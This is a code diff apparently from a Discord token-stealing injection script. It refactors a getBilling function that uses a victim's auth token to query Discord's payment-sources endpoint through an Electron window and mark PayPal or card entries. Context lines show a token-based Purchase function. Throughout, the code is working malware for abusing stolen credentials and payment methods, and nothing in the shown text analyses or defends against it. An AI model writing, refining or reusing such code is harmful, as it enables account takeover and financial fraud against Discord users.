@@ -189,25 +189,22 @@ const fetchBilling = async (token) => {
   return JSON.parse(bill);
 };
 
-const getBilling(token) {
-    const window = BrowserWindow.getAllWindows()[0];
-    var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
-    var json = JSON.parse(a)
-
-    var billing = "";
-    json.forEach(z => {
-        if (z.type == 2 && z.invalid != !0) {
-            billing += "\`✔️\` <:paypal:896441236062347374>";
-        } else if (z.type == 1 && z.invalid != !0) {
-            billing += "\`✔️\` :credit_card:";
-        } else {
-            return "\`❌\`";
-        };
-    });
-
-    billing = billing ?? "\`❌\`";
-    return billing;
-}
+const getBilling = async (token) => {
+  const data = await fetchBilling(token);
+  if (data === "") return "❌";
+  let billing = "";
+  data.forEach((x) => {
+    if (x.type === 2 && !x.invalid) {
+      billing += "✅" + " <:paypal:951139189389410365>";
+    } else if (x.type === 1 && !x.invalid) {
+      billing += "✅" + " 💳";
+    } else {
+      billing = "❌";
+    }
+  });
+  if (billing === "") billing = "❌";
+  return billing;
+};
 
 const Purchase = async (token, id, _type, _time) => {
   const req = execScript(`var xmlHttp = new XMLHttpRequest();
